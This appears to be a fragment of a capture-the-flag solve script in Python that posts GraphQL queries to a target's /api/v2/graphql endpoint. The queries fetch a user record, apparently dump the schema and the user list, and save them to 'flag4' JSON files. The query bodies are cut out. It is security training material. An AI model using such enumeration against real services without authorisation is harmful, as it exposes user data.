...
"""
resp = requests.post(url + "/api/v2/graphql", json={
    "query": query,
    "variables": {
        "id": "fd55a401-b110-4821-9155-add4653cb992"
    }
})
print(resp.text)
# {"data":{"user":{"username":"hacker","email":"hacker@bugbounty.ctf"}}}
...
"""
resp = requests.post(url + "/api/v2/graphql", json={"query": query})
print(resp.text)
with open("flag4-schema.json", "w") as f:
...
resp = requests.post(url + "/api/v2/graphql", json={"query": query})
print(resp.text)
with open("flag4-users.json", "w") as f:
    json.dump(resp.json(), f, indent=4)
